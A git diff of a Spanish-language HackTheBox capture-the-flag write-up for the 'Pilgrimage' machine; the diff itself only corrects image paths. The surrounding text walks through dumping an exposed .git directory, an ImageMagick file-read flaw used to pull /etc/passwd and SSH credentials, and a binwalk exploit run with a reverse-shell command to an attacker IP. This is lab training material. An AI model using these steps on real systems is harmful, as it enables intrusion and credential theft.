@@ -5,7 +5,7 @@ excerpt: "Para resolver esta máquina nos aprovechamos del código fuente del se
 date: 2023-10-30
 classes: wide
 header:
-  teaser: /assets/images/htb-writeup-sau/pilgrimage_logo.png
+  teaser: /assets/images/htb-writeup-pilgrimage/pilgrimage_logo.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
@@ -19,7 +19,7 @@ tags:
   - abusing scripting bash
 ---
 
-![](/assets/images/htb-writeup-sau/pilgrimage_logo.png)
+![](/assets/images/htb-writeup-pilgrimage/pilgrimage_logo.png)
 
 Para resolver esta máquina nos aprovechamos del código fuente del servicio web, que lo obtenemos al hacer la respectiva enumeración, donde allí veremos como funciona por detrás a la hora de subir una imagen, incluso viendo la versión de la herramienta que se utiliza para subir la imagen, la cual contiene una vulnerabilidad de las que nos aprovechamos para convertirla a LFI obteniendo credenciales válidas para conectarnos por SSH, para posterior a ello llevar un RCE para escalar nuestro privilegio
 
@@ -61,7 +61,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ________
 
 
-![](/assets/images/htb-writeup-sau/Pasted image 20231030160138.png)
+![](/assets/images/htb-writeup-pilgrimage/Pasted image 20231030160138.png)
 
 Tendríamos este sitio web, el cual podemos registrarnos, para loguerarnos y posterior a esto subir fotos, aunque no es necesario, pero sí nos logueamos sería más fácil para ver las fotos que hemos subido con su ruta de donde está subida.
 
@@ -81,12 +81,12 @@ Podemos analizar el código fuente, probar con credenciales básicas & default p
 Vemos que el recurso **Git** que usualmente suele estar oculto está expuesto, estos podríamos descargarlo manualmente, pero sí indagamos podríamos encontrar herramientas qué descargan los recursos automáticamente, como por ejemplo esta [Git Dumper](https://github.com/arthaud/git-dumper), la cual nos descargará los recursos de la URL indicada con el directorio **/.git** indicado, sé recomienda leer cómo usarla en el repositorio de la misma herramienta.
 
 
-![](/assets/images/htb-writeup-sau/Pasted image 20231030161111.png)
+![](/assets/images/htb-writeup-pilgrimage/Pasted image 20231030161111.png)
 
 Sí nos abrimos el "**index.php**".
 
 
-![](/assets/images/htb-writeup-sau/Pasted image 20231030161308.png)
+![](/assets/images/htb-writeup-pilgrimage/Pasted image 20231030161308.png)
 
 
 Notaremos qué está usando el el "**Magick Convert**", para hacer un resize del %50, y meterlo en la ruta de descargar con un nuevo nombre, y la extensión de la imagen, y más abajo nos chiva la ruta absoluta donde está guardando esto.
@@ -99,16 +99,16 @@ Sí indagamos en busca de vulnerabilidades de esta versión de **magick**, encon
 
 Una vez subamos la imagen, nos descargamos la misma imagen en local con "wget" para visualizar los metadatos de la misma con "identify".
 
-![](/assets/images/htb-writeup-sau/Pasted image 20231030163405.png)
+![](/assets/images/htb-writeup-pilgrimage/Pasted image 20231030163405.png)
 
 Nos representará una cadena en **hexadecimal**, la cual debemos convertir en texto claro para que sea legible y en éste caso ver el "/etc/passwd", en este caso usaremos un convertidor online para convertirlo en texto claro.
 
-![](/assets/images/htb-writeup-sau/Pasted image 20231030163639.png)
+![](/assets/images/htb-writeup-pilgrimage/Pasted image 20231030163639.png)
 
 
 Como vemos hemos llevado a cabo un **LFI** y leído el passwd, pero sí intentamos listar las claves del .ssh no veremos nada, ni indagando encontraríamos nada interesante, por lo qué nos aprovechamos qué sabemos la ruta absoluta de la db, que es "**/var/db/pilgrimage**" para tratar de ver sí conseguimos credenciales.
 
-![](/assets/images/htb-writeup-sau/Pasted image 20231030164035.png)
+![](/assets/images/htb-writeup-pilgrimage/Pasted image 20231030164035.png)
 
 En la cual al convertirla a texto plano encontraríamos las credenciales de **emily** para conectarnos a través de **SSH**.
 
@@ -119,7 +119,7 @@ _________
 
 Usamos **pspy64** para buscar posibles brechas qué podamos aprovechar para escalar nuestro privilegios a Root.
 
-![](/assets/images/htb-writeup-sau/Pasted image 20231030164924.png)
+![](/assets/images/htb-writeup-pilgrimage/Pasted image 20231030164924.png)
 
 Vemos qué Root está ejecutando un script en bash, en el cual podemos leer y dentro tiene el siguiente código:
 
@@ -143,7 +143,7 @@ done
 
 El script monitorea el directorio `/var/www/pilgrimage.htb/shrunk/` en busca de archivos recién creados. Luego, verifica si el contenido de cada archivo contiene ciertas cadenas de texto prohibidas, como "Executable script" o "Microsoft executable". Si se encuentra alguna de estas cadenas, el archivo se elimina automáticamente, y lo está haciendo con el binario binwalk.
 
-![](Pasted image 20231030165452.png)
+![](/assets/images/htb-writeup-pilgrimage/Pasted image 20231030165452.png)
 
 Cuyo versión **binwalk**, sí indagamos en busca de vulnerabilidades encontraremos qué podemos llevar a cabo un **RCE** con esta versión en específico según Exploit-DB, el cual ahí mismo nos proporciona un exploit programado en python para otorgarnos una Reverse Shell. [(Click aquí para ver exploit)](https://www.exploit-db.com/exploits/51249)
 
@@ -153,4 +153,4 @@ El cuál debemos ejecutarnos estando en la ruta "/var/www/pilgrimage.htb/shrunk"
 python3 exploit.py image.png 10.10.14.x 443
 ```
 
-![](/assets/images/htb-writeup-sau/Pasted image 20231030170607.png)
+![](/assets/images/htb-writeup-pilgrimage/Pasted image 20231030170607.png)
